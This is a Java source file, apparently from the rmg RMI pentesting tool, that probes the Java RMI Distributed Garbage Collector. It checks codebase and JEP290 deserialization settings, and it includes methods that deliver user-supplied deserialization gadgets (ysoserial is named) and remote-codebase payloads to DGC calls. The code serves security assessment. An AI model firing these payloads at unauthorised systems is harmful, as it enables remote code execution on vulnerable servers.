package de.qtc.rmg.operations;

import java.rmi.server.ObjID;
import java.util.HashMap;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodArguments;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIEndpoint;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;

/**
 * The distributed garbage collector (DGC) is a well known RMI object with publicly known method definitions.
 * In the early days of RMI, the DGC was the prime target for attackers and most attacks like codebase
 * or deserialization exploits targeted methods exposed by the DGC.
 *
 * Today, the DGC is probably one of the most locked down RMI interfaces. It implements a very strict
 * deserialization filter for incoming and outgoing calls, enables useCodebaseOnly internally, which overwrites
 * the user settings and uses an separate SecurityManager that denies basically everything apart from accepting
 * connections.
 *
 * Nonetheless, pentesters may to test DGC protections during security assessments to identify vulnerabilities
 * on outdated RMI endpoints or custom implementations. Therefore, DGC support was also implemented for rmg.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class DGCClient {

    private RMIEndpoint rmi;

    private static final long interfaceHash = -669196253586618813L;
    private static final ObjID objID = new ObjID(ObjID.DGC_ID);

    public DGCClient(RMIEndpoint rmiEndpoint)
    {
        this.rmi = rmiEndpoint;
    }

    /**
     * The enumDGC function performs basically a codebase enumeration. The function was not named enumCodebase or anything like that,
     * because this could be misleading. On modern RMI endpoints, the DGC cannot be used to enumerate the codebase properly. First of
     * all, the DGC setting of useCodebaseOnly is always true, independent of the user defined settings. And even if this is not the
     * case, the separate SecurityManager would deny class loading.
     *
     * This function just makes a codebase call with an invalid URL as class annotation. When the DGC just ignores the codebase or
     * gives an 'access denied' status in the ClassNotFoundException, the DGC is flagged as up to date. Otherwise, it is flagged
     * as outdated, as the behavior is not normal for current RMI endpoints.
     *
     * @param callName
     */
    public void enumDGC(String callName)
    {
        try {
            Logger.printlnBlue("RMI DGC enumeration:");
            Logger.lineBreak();
            Logger.increaseIndent();

            MaliciousOutputStream.setDefaultLocation("InvalidURL");
            dgcCall(callName, packArgsByName(callName, new DefinitelyNonExistingClass()), true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            Throwable c = ExceptionHandler.getThrowable("ClassNotFoundException", e);

            if( c != null ) {

                if( c.getMessage().contains("no security manager: RMI class loader disabled") ) {
                    Logger.printlnMixedYellow("- RMI server", "does not", "use a SecurityManager during DGC operations.");
                    Logger.printlnMixedYellow("  --> Remote class loading attacks", "are not", "possible.");
                    Logger.statusOutdated();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().contains("access to class loader denied") ) {
                    Logger.printlnMixedYellow("- Security Manager", "rejected access", "to the class loader.");
                    Logger.printlnMixedBlue("  --> The DGC uses most likely a", "separate security policy.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().equals("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                    Logger.printlnMixedYellow("- RMI server", "did not", "attempt to parse the supplied codebase.");
                    Logger.printlnMixedBlue("  --> DGC is most likely configured with", "useCodebaseOnly=false.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else {
                    ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);
                }

            } else if( t instanceof java.net.MalformedURLException) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + callName + " call.");
                Logger.printMixedBlue("  --> The DGC", "attempted to parse", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                Logger.statusNonDefault();
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Checks for deserialization filters on the DGC endpoint. This is pretty straight forward. Just sends a
     * java.util.HashMap during a DGC call and checks whether the class is rejected.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     */
    public void enumJEP290(String callName)
    {
        try {
            Logger.printlnBlue("RMI server JEP290 enumeration:");
            Logger.lineBreak();
            Logger.increaseIndent();

            dgcCall(callName, packArgsByName(callName, new HashMap<String,String>()), false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.printMixedYellow("- DGC", "rejected", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is installed).");
                Logger.statusOk();
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is not installed).");
                Logger.statusVulnerable();
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
            Logger.printPlainBlue(" java.util.HashMap");
            Logger.printlnPlainYellow(" (JEP290 is not installed).");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    /**
     * Invokes a DGC method with a user controlled codebase as class annotation. The codebase is already set
     * by the ArgumentParser during the startup of the program. This method was never successfully tested, as
     * it is difficult to find a Java version that is still vulnerable to this :D
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param payloadObject object to use during the codebase call
     */
    public void codebaseCall(String callName, Object payloadObject)
    {
        String className = payloadObject.getClass().getName();
        Logger.printCodebaseAttackIntro("DGC", callName, className);

        try {
            dgcCall(callName, packArgsByName(callName, payloadObject), true);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC", className);
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, callName, "call");

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
                ExceptionHandler.codebaseSecurityManager(e);

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
                ExceptionHandler.codebaseClassNotFound(e, className);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.codebaseClassCast(e, false);

            } else if( cause instanceof java.security.AccessControlException) {
                ExceptionHandler.accessControl(e, callName, "call");

            } else {
                ExceptionHandler.unexpectedException(e, callName, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, callName, "call", false);
        }
    }

    /**
     * Invokes a DGC call with a user controlled payload object (usually a gadget created by ysoserial).
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param payloadObject object to use during the DGC call
     */
    public void gadgetCall(String callName, Object payloadObject)
    {
        Logger.printGadgetCallIntro("DGC");

        try {
            dgcCall(callName, packArgsByName(callName, payloadObject), false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC", "gadget-class");

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, false);

            } else {
                ExceptionHandler.unknownDeserializationException(e);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, callName, "call", false);
        }
    }

    /**
     * DGC calls are implemented by using the genericCall function of the RMIEndpoint class. This allows to dispatch raw RMI
     * calls with fine granular control of the call parameters. The DGC interface on the server side is implemented
     * by using a skeleton, that still uses the old RMI calling convetion. Therefore, we have to use an interfaceHash
     * instead of method hashes and need to specify the call number as callID. The callID can be looked up
     * by name using the helper function defined below.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param callArguments the arguments to use during the call
     * @param maliciousStream whether to use the MaliciousOutputStream, required for custom codebase values
     * @throws Exception all connection related exceptions are caught, but anything other is thrown
     */
    private void dgcCall(String callName, MethodArguments callArguments, boolean maliciousStream) throws Exception
    {
        try {
            rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);

        } catch( java.rmi.NoSuchObjectException e ) {
            ExceptionHandler.noSuchObjectException(e, "DGC", false);
        }
    }

    /**
     * Looks up the callID for the specified DGC call. DGC endpoints only support the methods clean and dirty.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @return callID for the corresponding call
     */
    private int getCallByName(String callName)
    {
        switch(callName) {
            case "clean":
                return 0;
            case "dirty":
                return 1;
            default:
                ExceptionHandler.internalError("DGCClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
        }

        return 0;
    }

    /**
     * Depending on the desired DGC call, the structure of the input arguments has to be different. This function
     * builds the argument array according to the specified DGC call. The user specified payload object is inserted
     * at a location that is deserialized by readObject.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param payloadObject object to use during the DGC call
     * @return MethodArguments that can be used for the corresponding call
     */
    private MethodArguments packArgsByName(String callName, Object payloadObject)
    {
        MethodArguments callArguments = new MethodArguments(4);

        switch(callName) {
            case "clean":
                callArguments.add(new ObjID[]{}, Object.class);
                callArguments.add(0L, long.class);
                callArguments.add(payloadObject, Object.class);
                callArguments.add(true, boolean.class);
                break;
            case "dirty":

                callArguments.add(new ObjID[]{}, Object.class);
                callArguments.add(0L, long.class);
                callArguments.add(payloadObject, Object.class);
                break;

            default:
                ExceptionHandler.internalError("DGCClient.packArgsByName", "Unable to find pack strategy for method '" + callName + "'.");
        }

        return callArguments;
    }
}
